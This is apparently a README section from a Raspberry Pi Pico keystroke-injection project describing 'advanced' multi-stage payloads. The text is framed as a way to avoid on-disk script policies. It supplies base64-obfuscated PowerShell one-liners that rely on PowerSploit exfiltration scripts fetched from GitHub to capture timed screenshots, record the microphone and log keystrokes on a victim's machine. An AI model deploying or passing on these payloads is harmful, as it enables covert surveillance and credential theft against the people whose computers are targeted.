## Advanced Payloads

These are generally payloads that utilize the previously mentioned project scripts.
Essentially, these are more often than not multi-stage payloads.

The idea behind loading multi-stage payloads is so that everything is kept in memory. This in turn denys the need for on-disc script execution, which is more often than not disabled by policy in environments managed by competent teams. Regardless, if it came down to a script being to big to load from the pico's flash memory, I would still turn to using an sd card module. Hence the inclusion of the sdcard library and scripts.

## Payloads Examples

- Take a screenshot
- Store in user's desktop in a folder named *tmp*
- repeat every 30 seconds
- stop at 5:00 PM (This script used 24hr format, so it turns into 17:00)
- Requires [Get-TimedScreenshot](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1)

```
R2V0LVRpbWVkU2NyZWVuc2hvdCAtUGF0aCAkSE9NRVxEZXNrdG9wXHRtcCAtSW50ZXJ2YWwgMzAgLUVuZFRpbWUgMTc6MDA=
```

- Get Audio from microhphone
- Record for 10 seconds
- Store in *secret.wav* on user's Desktop in *tmp*
- Requires [Get-MicrophoneAudio](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1)

```
R2V0LU1pY3JvcGhvbmVBdWRpbyAtUGF0aCAkSE9NRVxEZWtzdG9wXHRtcFxzZWNyZXQud2F2IC1MZW5ndGggMTA=
```

- Log keystrokes to *keys.log* a file on the user's Desktop
- Requires [Get-Keystrokes](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)

```
R2V0LUtleXN0cm9rZXMgLUxvZ1BhdGggJEhPTUVcRGVza3RvcFxrZXlzLmxvZw==
```